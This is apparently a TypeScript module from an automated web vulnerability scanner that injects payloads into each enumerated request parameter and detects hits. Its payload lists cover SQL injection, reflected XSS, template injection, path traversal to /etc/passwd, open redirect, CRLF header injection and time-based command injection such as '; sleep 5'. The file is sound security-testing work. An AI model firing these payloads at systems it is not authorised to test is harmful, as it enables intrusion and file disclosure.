// Inventory-driven injection probing — Phase 2 of the probe pipeline (issue #9). Where probe.ts
// injects into a STATIC param name picked by a rule, this drives probing off the ENUMERATED
// inject-point inventory (injectpoint.ts): for every actual parameter of a request — query, body
// dotpath (nested/array), id-shaped path segment, injectable header — it sends the payload set for
// each injection class and detects a hit, then emits a signal naming the EXACT parameter. This is
// what turns "we have the params" into "Vortex probed each param and found the sink".
//
// Detection modes: "reflected" (canary bounced back → XSS), "evaluated" (template canary's product
// surfaced → SSTI), "error" (a DBMS/interpreter error signature appears in the probe response that
// was NOT in the baseline → SQLi / path-traversal). Time-based blind is a later refinement.
import type { Transaction, Severity } from "./transaction"
import { header } from "./transaction"
import type { Signal } from "./rule"
import { dedupe } from "./rule"
import type { Sender } from "./active"
import type { Apply } from "./send"
import type { InjectPoint, Coverage, ValueType } from "./injectpoint"
import { injectPoints } from "./injectpoint"
import type { TrafficStore } from "./store"
import { replaySafety } from "./replay-safety"
import { reflects, brokeOut, mintTemplateCanary, TEMPLATE_PLACEHOLDER, CANARY_PLACEHOLDER } from "./canary"
import { endpointKey } from "./endpoint"
import { runActiveRules } from "./active"
import { idorActiveRules } from "./rules/idor-active"
import { observed } from "./scope"

// How a payload class decides a hit:
//  - reflected : a tracked canary bounced back into the response body (XSS lead).
//  - evaluated : a template canary's PRODUCT surfaced (SSTI — the engine evaluated our expression).
//  - error     : a DBMS/interpreter error signature appears in the probe body but NOT the baseline.
//  - redirect   : the probe response Location points at our injected canary host (open redirect).
//  - header-inject : an injected header (carrying our canary) surfaced in the probe RESPONSE headers (CRLF).
//  - time       : the probe response is slower than the baseline by a threshold (blind command injection).
export type DetectMode = "reflected" | "evaluated" | "error" | "redirect" | "header-inject" | "time"

// Blind command-injection threshold: payloads sleep ~5s, so a probe that runs ≥ this much slower than
// the baseline (and ≥ this in absolute terms) is a strong time-based lead. A real deployment can diff
// multiple samples; one differential sample is enough to QUEUE a specialist (it still confirms).
const SLEEP_THRESHOLD_MS = Math.max(1000, Number(process.env.CYBERSTRIKE_PROBE_SLEEP_MS) || 4000)
// The header name a CRLF payload injects; its presence in the response headers (carrying the canary
// token) proves the raw CR/LF split the header block. Kept distinctive so a hit is unambiguous.
const CRLF_HEADER = "x-vxcrlf"

// Which inject points a payload class applies to (#88 Phase B). Absent ⇒ the class probes EVERY point
// (backward-compatible). Present ⇒ the class is restricted to points whose name/type matches — so a
// narrow class (path-traversal, and later open-redirect / cmd-injection) stops spraying its payloads at
// every param (budget + noise), while the universal classes (SQLi/XSS) keep no `select` and still anchor
// every point so nothing is left unprobed.
export interface PayloadSelect {
  name?: string // JS regex source, matched case-insensitively against the param name AND its dotpath
  type?: ValueType[] // only probe points of these value types
}

export interface PayloadClass {
  id: string
  category: string
  severity: Severity
  detect: DetectMode
  payloads: string[] // "{canary}" for reflected, "{template}" for evaluated
  signatures?: RegExp[] // detect "error": a hit is a signature present in the probe body but NOT the baseline
  select?: PayloadSelect // #88: restrict this class to matching inject points (absent = all points)
}

// Does this inject point match a class's `select`? A class with no `select` matches everything. Name is
// tested against the human leaf AND the dotpath (so a body field `filters.0.redirect` still matches a
// url-ish family). Compiled once per pass by `selectMatcher`.
function selectMatcher(sel: PayloadSelect | undefined): (pt: InjectPoint) => boolean {
  if (!sel) return () => true
  const re = sel.name ? new RegExp(sel.name, "i") : undefined
  const types = sel.type
  return (pt) => {
    if (types && !types.includes(pt.valueType)) return false
    if (re && !re.test(`${pt.name ?? ""} ${pt.dotpath}`)) return false
    return true
  }
}

// Multi-DBMS SQL error signatures — kept specific enough that a differential match (present in the
// probe response, absent from the baseline) is a real error surfaced by our payload, not chrome.
const SQL_ERRORS: RegExp[] = [
  /you have an error in your SQL syntax|SQL syntax.*MySQL|valid MySQL result|mysqli?_/i,
  /SQLSTATE\[|PDOException/i,
  /ORA-\d{5}/i,
  /PostgreSQL.*ERROR|PG::\w*Error|psycopg2|unterminated quoted string/i,
  /SQLite3?::|sqlite3\.OperationalError/i,
  /Microsoft OLE DB|ODBC SQL Server|Unclosed quotation mark|Incorrect syntax near/i,
  /System\.Data\.SqlClient|Npgsql\./i,
  /quoted string not properly terminated|ORA-00933/i,
  /SQL compilation error|\b\d{6} \(\d{5}\):/i, // Snowflake (e.g. "100040 (22007):")
]

// Unix/Windows file-read signatures for path traversal / LFI.
const FILE_ERRORS: RegExp[] = [/root:.*?:0:0:/, /\[boot loader\]|\[fonts\]/i, /daemon:.*?:\/usr\/sbin/]

export const injectionPayloads: PayloadClass[] = [
  {
    id: "sqli-error",
    category: "injection",
    severity: "high",
    detect: "error",
    payloads: ["'", '"', "')", "' OR '1'='1", "1 OR 1=1", "';", "'--", "\\"],
    signatures: SQL_ERRORS,
  },
  {
    id: "xss-reflected",
    category: "injection",
    severity: "medium",
    detect: "reflected",
    payloads: ['"><vx>{canary}</vx>', "<vx>{canary}</vx>", "'\"><vx>{canary}</vx>"],
  },
  {
    id: "ssti",
    category: "injection",
    severity: "high",
    detect: "evaluated",
    payloads: [`{{${TEMPLATE_PLACEHOLDER}}}`, `\${${TEMPLATE_PLACEHOLDER}}`, `#{${TEMPLATE_PLACEHOLDER}}`, `{${TEMPLATE_PLACEHOLDER}}`],
  },
  {
    id: "path-traversal",
    category: "injection",
    severity: "high",
    detect: "error",
    payloads: ["../../../../../../etc/passwd", "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", "....//....//....//etc/passwd"],
    signatures: FILE_ERRORS,
    // #88 Phase B: a traversal payload only makes sense on a file/path-ish param. Narrowing here is the
    // concrete budget win — stop firing `../etc/passwd` at every numeric id, token or unrelated field.
    // string/empty only (a uuid/objectid/bool/number param is not a file handle).
    select: { name: "file|path|page|template|include|doc|download|dir|folder|name|url|src|load|read|view|cat|action", type: ["string", "empty"] },
  },
  {
    // #88 Phase A — open redirect. Inject an absolute / protocol-relative URL whose host carries the
    // canary token (the engine mints it and substitutes {canary}); a hit is the probe's Location header
    // pointing back at that unique host. The governed sender sends with followRedirects:false, so the
    // 3xx Location is visible rather than chased.
    id: "open-redirect",
    category: "redirect",
    severity: "medium",
    detect: "redirect",
    payloads: ["https://{canary}.vxredir.test/x", "//{canary}.vxredir.test/x", "/\\{canary}.vxredir.test"],
    // Boundaries on the short tokens (\bto\b/\bu\b/\br\b) so "user"/"order"/"number" do NOT match — only
    // a param actually named to/u/r. Longer names match as substrings (returnUrl, redirect_uri, …).
    select: { name: "url|uri|redirect|redir|next|return|dest|destination|continue|target|goto|callback|forward|\\bto\\b|\\bu\\b|\\br\\b", type: ["string", "empty"] },
  },
  {
    // #88 Phase A — CRLF / HTTP response-header injection. Inject raw/encoded CR-LF followed by a
    // distinctive header carrying the canary token; a hit is that header surfacing in the probe RESPONSE
    // (the server echoed our CR/LF into its header block). High severity: response splitting / cache
    // poisoning / header-based auth bypass.
    id: "crlf-header",
    category: "injection",
    severity: "high",
    detect: "header-inject",
    payloads: [`%0d%0a${CRLF_HEADER}:{canary}`, `\r\n${CRLF_HEADER}:{canary}`, `%0d%0a${CRLF_HEADER}:{canary}%0d%0a`],
    select: { name: "url|uri|redirect|redir|next|return|returnurl|dest|continue|target|goto|callback|forward|location|path", type: ["string", "empty"] },
  },
  {
    // #88 Phase A — blind (time-based) command injection. Shell-metachar payloads that sleep ~5s; a hit
    // is the probe response arriving SLEEP_THRESHOLD_MS slower than the baseline. No canary (timing is
    // the oracle). Critical: typically full RCE.
    id: "command-injection",
    category: "injection",
    severity: "critical",
    detect: "time",
    payloads: ["; sleep 5", "| sleep 5", "$(sleep 5)", "`sleep 5`", "& ping -n 6 127.0.0.1 &", "%0a sleep 5"],
    select: { name: "host|hostname|ip|domain|cmd|command|exec|run|ping|ping_host|target|addr|address|url|dns|lookup|nslookup", type: ["string", "empty"] },
  },
]

// Build the send-mutation that targets a specific inject point. Path uses set-path-param whose name
// is the segment index — which is exactly what injectpoint.ts stores in `dotpath` (aligned with
// Mutate.setPathParam's split convention).
export function mutationForPoint(pt: InjectPoint, value: string): Apply.Mutation {
  if (pt.location === "query") return { op: "set-query", name: pt.dotpath, value }
  if (pt.location === "header") return { op: "set-header", name: pt.dotpath, value }
  if (pt.location === "path") return { op: "set-path-param", name: pt.dotpath, value }
  return { op: "body-set-field", name: pt.dotpath, value }
}

function errorSignature(sigs: RegExp[] | undefined, body: string | undefined, baseline: string | undefined): RegExp | undefined {
  if (!sigs || !body) return undefined
  // Differential: fire only when the signature is in the probe body AND we have a baseline proving
  // it was NOT already there. No baseline (the baseline send failed / had no body) ⇒ we cannot diff
  // ⇒ do NOT fire — otherwise `!(undefined && …)` would fire on any signature, a false positive on
  // error-like chrome that may have always been present.
  if (baseline === undefined) return undefined
  for (const re of sigs) {
    if (re.test(body) && !re.test(baseline)) return re
  }
  return undefined
}

export interface ProbeOptions {
  // Restrict to these class ids (default: all of injectionPayloads).
  classes?: string[]
  // Called once per (point, class) actually attempted, with the outcome — the coverage hook. Not
  // called for points skipped by replay-safety or a missing tx (those were never probed).
  onResult?: (c: Omit<Coverage, "at">) => void
  // Skip a point whose value type makes a class pointless (e.g. don't bother with none). Kept
  // permissive by default — an id-typed path param IS a valid SQLi target (validation may pass it
  // through), so we do NOT skip by type here.
}

// Probe an inventory of inject points. `resolveTx` maps a point back to its origin transaction (the
// request to mutate + send). Bounds itself to one confirmation per (class, point). Never probes a
// replay-unsafe request. Returns deduped signals; coverage persistence is the caller's job.
export async function probeInjectPoints(
  points: InjectPoint[],
  resolveTx: (txId: string) => Transaction | undefined,
  send: Sender,
  opts: ProbeOptions = {},
): Promise<Signal[]> {
  const classes = opts.classes ? injectionPayloads.filter((c) => opts.classes!.includes(c.id)) : injectionPayloads
  // #88 Phase B: compile each class's `select` once. A non-matching (point, class) pair is skipped
  // entirely — no send, no coverage row — so the point is still marked probed by the universal classes
  // that DO match it, and the budget is not spent injecting an inapplicable payload family.
  const matchers = new Map(classes.map((c) => [c.id, selectMatcher(c.select)]))
  const out: Signal[] = []
  // Baseline per tx: the body (differential reference for error detection) + the response time (the
  // reference for time-based command injection).
  const baselineByTx = new Map<string, { body?: string; ms?: number }>()

  // A single failed send (timeout / connection reset / TLS / the target momentarily down) must NOT
  // abort the whole probing pass and lose the signals + coverage gathered so far. Swallow the throw
  // and treat it as "no result" for that one send; the point still gets coverage (clean) so it is
  // marked probed and not retried in a storm.
  const trySend = async (input: Parameters<Sender>[0], o?: Parameters<Sender>[1]): Promise<Awaited<ReturnType<Sender>> | undefined> => {
    try {
      return await send(input, o)
    } catch {
      return undefined
    }
  }

  for (const pt of points) {
    const tx = resolveTx(pt.transactionId)
    if (!tx) continue
    if (!replaySafety(tx).safe) continue // never burn a session-minting / one-time-token request

    // Baseline for the tx (one send, cached) — body for error diffing, timing for the sleep oracle.
    if (!baselineByTx.has(tx.id)) {
      const base = await trySend(tx)
      baselineByTx.set(tx.id, { body: base?.transaction.response?.body, ms: base?.transaction.timing?.ms })
    }
    const baseline = baselineByTx.get(tx.id)!.body
    const baselineMs = baselineByTx.get(tx.id)!.ms
    const endpoint = endpointKey(tx)

    // Isolation mutations: blank every OTHER value param (query/body) of this request, keeping path
    // and headers (structural). Only used as a fallback when full-context probing is clean — to
    // reach a sink a sibling param was masking. Its own baseline (others blanked, target original)
    // is fetched lazily so the error differential is correct and costs one extra send only when
    // isolation is actually reached.
    const isolationBlanks = injectPoints(tx)
      .filter((o) => (o.location === "query" || o.location === "body") && !(o.location === pt.location && o.dotpath === pt.dotpath))
      .map((o) => mutationForPoint(o, ""))
    let isolatedBaseline: string | undefined
    let isolatedBaselineReady = false
    const ensureIsolatedBaseline = async () => {
      if (isolatedBaselineReady) return
      isolatedBaselineReady = true
      if (isolationBlanks.length > 0) isolatedBaseline = (await trySend(tx, { mutations: isolationBlanks }))?.transaction.response?.body
    }

    for (const cls of classes) {
      // #88 Phase B: skip a class that does not apply to this point (no send, no coverage). The point is
      // still anchored by the universal classes, so it is not left unprobed.
      if (!matchers.get(cls.id)!(pt)) continue
      let confirmed = false
      let hitStrategy: "full" | "isolated" | undefined
      // full first (realistic, all siblings present); isolated only if full found nothing — bounds
      // the extra sends to the cases a sibling might have masked.
      for (const strategy of ["full", "isolated"] as const) {
        if (confirmed) break
        if (strategy === "isolated") {
          if (isolationBlanks.length === 0) break // single-param request — nothing to isolate
          await ensureIsolatedBaseline()
        }
        const baseForErr = strategy === "isolated" ? isolatedBaseline : baseline
        for (const payload of cls.payloads) {
          if (confirmed) break
          const tc = cls.detect === "evaluated" ? mintTemplateCanary() : undefined
          const value = tc ? payload.split(TEMPLATE_PLACEHOLDER).join(tc.expr) : payload
          const mutations = strategy === "isolated" ? [...isolationBlanks, mutationForPoint(pt, value)] : [mutationForPoint(pt, value)]
          // A class whose payload carries {canary} (reflected XSS, open-redirect, CRLF) needs the send
          // engine to mint a unique token, substitute it for {canary}, and return it — so detection can
          // scan for that exact token (body / Location / response headers). No hardcoded sentinels.
          const needsCanary = payload.includes(CANARY_PLACEHOLDER)
          const res = await trySend(tx, {
            mutations,
            canary: needsCanary ? { field: pt.dotpath, vulnClass: cls.category } : undefined,
          })
          if (!res) continue // send failed (timeout/reset/TLS) — skip this payload, don't abort the pass
          const body = res.transaction.response?.body
          const token = res.canary?.token

          let hit = false
          let evidence = ""
          let severity: Severity = cls.severity
          if (cls.detect === "reflected") {
            hit = !!res.canaryReflected
            if (hit) {
              const injectable = res.canary ? brokeOut(body, value, res.canary.token) : false
              severity = injectable ? "high" : cls.severity
              evidence = injectable ? "canary reflected UNESCAPED (likely injectable)" : "canary reflected"
            }
          } else if (cls.detect === "evaluated") {
            hit = !!tc && reflects(body, tc.marker)
            if (hit) evidence = "template expression evaluated (SSTI)"
          } else if (cls.detect === "redirect") {
            // Open redirect: the probe's Location points at our injected canary host (sender does not
            // follow redirects, so the 3xx Location is captured). Unique token ⇒ no false positive.
            const loc = header(res.transaction.response?.headers ?? [], "location")
            hit = !!token && !!loc && loc.includes(token)
            if (hit) evidence = `open redirect — Location points at the injected canary host: ${loc}`
          } else if (cls.detect === "header-inject") {
            // CRLF: our injected header (carrying the canary) surfaced in the RESPONSE headers — the raw
            // CR/LF split the server's header block. Match by the distinctive name AND the token value.
            const injected = header(res.transaction.response?.headers ?? [], CRLF_HEADER)
            hit = !!token && !!injected && injected.includes(token)
            if (hit) evidence = `CRLF / header injection — injected ${CRLF_HEADER} surfaced in the response (response splitting)`
          } else if (cls.detect === "time") {
            // Blind command injection: the sleep payload made THIS response arrive materially slower than
            // the baseline (and slow in absolute terms). Needs a baseline time to diff against.
            const probeMs = res.transaction.timing?.ms
            hit =
              probeMs !== undefined &&
              baselineMs !== undefined &&
              probeMs - baselineMs >= SLEEP_THRESHOLD_MS &&
              probeMs >= SLEEP_THRESHOLD_MS
            if (hit) evidence = `blind command injection — response delayed ${probeMs}ms vs ${baselineMs}ms baseline (payload induced sleep)`
          } else {
            const sig = errorSignature(cls.signatures, body, baseForErr)
            hit = !!sig
            if (hit) evidence = `error signature surfaced (absent from baseline): ${sig}`
          }
          if (!hit) continue

          out.push({
            ruleId: cls.id,
            transactionId: res.transaction.id,
            severity,
            category: cls.category,
            title: `${cls.id} at ${endpoint} (${pt.location} ${pt.name ?? pt.dotpath})`,
            evidence: `payload into ${pt.location}.${pt.dotpath} on ${endpoint} [${strategy}] — ${evidence}`,
            param: { location: pt.location, dotpath: pt.dotpath, name: pt.name },
            dedupKey: `${cls.id}:${pt.id}`,
          })
          confirmed = true
          hitStrategy = strategy
        }
      }
      opts.onResult?.({
        paramId: pt.id,
        transactionId: pt.transactionId,
        payloadClass: cls.id,
        result: confirmed ? "hit" : "clean",
        strategy: hitStrategy ?? (isolationBlanks.length > 0 ? "isolated" : "full"),
        signalId: confirmed ? `${cls.id}:${pt.id}` : undefined,
      })
    }
  }
  return dedupe(out)
}

// Convenience over a store: probe its (by default not-yet-probed) inject points with a real sender,
// then persist the signals + per-(param,class) coverage and mark the points probed. This is what the
// bridge calls — inventory in, signals + auditable coverage out. Bound your sends with a governed
// `send`; this helper does not rate-limit on its own.
export async function probeSession(
  store: TrafficStore,
  send: Sender,
  opts: ProbeOptions & { onlyUnprobed?: boolean } = {},
): Promise<{ signals: Signal[]; coverage: Coverage[]; probed: number }> {
  const points = opts.onlyUnprobed === false ? store.injectPoints() : store.injectPoints({ probed: false })
  const coverage: Coverage[] = []
  const injectSignals = await probeInjectPoints(points, (id) => store.get(id), send, {
    ...opts,
    onResult: (c) => {
      coverage.push({ ...c, at: Date.now() })
      opts.onResult?.(c)
    },
  })
  // Neighbour-ID BOLA/IDOR probing runs alongside injection probing on the same governed sender, over
  // the observed corpus (never replays). Its own work is bounded (one probe per endpoint+path-param).
  const activeSignals = await runActiveRules(idorActiveRules, observed(store.all()), send)
  const signals = [...injectSignals, ...activeSignals]
  store.addSignals(signals)
  store.recordCoverage(coverage)
  // Mark only the points we actually attempted (those that produced coverage — replay-unsafe /
  // unresolvable points were skipped and must stay unprobed so a later pass can retry them).
  const attempted = new Set(coverage.map((c) => c.paramId))
  const marked = points.filter((p) => attempted.has(p.id)).map((p) => ({ ...p, probed: true }))
  store.addInjectPoints(marked)
  return { signals, coverage, probed: marked.length }
}
